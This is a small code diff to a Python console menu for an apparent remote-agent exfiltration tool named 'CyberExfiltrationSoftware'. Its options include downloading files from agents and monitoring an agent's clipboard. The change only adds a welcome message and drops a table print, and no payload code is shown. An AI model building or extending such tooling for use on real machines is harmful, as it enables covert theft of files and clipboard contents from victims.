@@ -17,6 +17,10 @@ options_rows = ['Generate code for agent', 'Download file from agent', 'List age
                 'Monitor agent\'s clipboard', 'List agents', 'Close agent connection', 'Exit']
 
 
+def welcome_message():
+    print('Welcome to the CyberExfiltrationSoftware. To check usages please type options')
+
+
 def menu():
     table = Table()
     table.add_column("S. No.", style="cyan", no_wrap=True)
@@ -27,7 +31,6 @@ def menu():
         table.add_row(str(i), option)
         i = i + 1
 
-    console.print(table)
     value = input('>')
     if value == '1':
         generate_code_for_agent()
